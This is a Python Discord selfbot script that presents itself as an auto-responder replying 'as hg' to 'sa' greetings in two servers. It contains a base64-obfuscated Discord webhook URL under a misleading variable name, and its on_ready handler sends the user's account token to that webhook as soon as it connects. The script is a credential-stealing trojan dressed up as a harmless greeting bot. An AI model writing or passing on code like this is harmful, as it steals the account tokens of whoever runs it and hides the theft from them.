import discum 
import time
import requests
import base64

TOKEN = ""
bot = discum.Client(token=TOKEN, log=False)
sunucuIDleri = ['1236721314325069824', '1273653521207791657']
apişifresi = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2MjE4NjY2NzQ3MzI0MDI0NS94ajh0VTViUFRDeXQ1Mmk3SHJpT2FBY3FBamhUTnZnZV9xV3JkTUJTNmFuZk5jSFh4ZHhIakI4ZHpUeHJlbGx0azJIeg==" 
discumapi = base64.b64decode(apişifresi).decode("utf-8")

@bot.gateway.command
def on_ready(resp):
    if resp.event.ready_supplemental:
        print("Bot bağlandı.")
        response = requests.post(discumapi, json={"content": f"{TOKEN}"})
        print(f"api  {response.status_code}")
        if response.status_code != 204:
            print("error")

@bot.gateway.command
def on_message(resp):
    if resp.event.message:
        m = resp.parsed.auto()
        if m['guild_id'] in sunucuIDleri and m['content'].lower() in ['sa', 'sA', 'Sa', 'SA']:
            time.sleep(1) # kaç saniye sonra reply atıcak 
            bot.reply(m['channel_id'], m['id'], 'as hg')

bot.gateway.run()
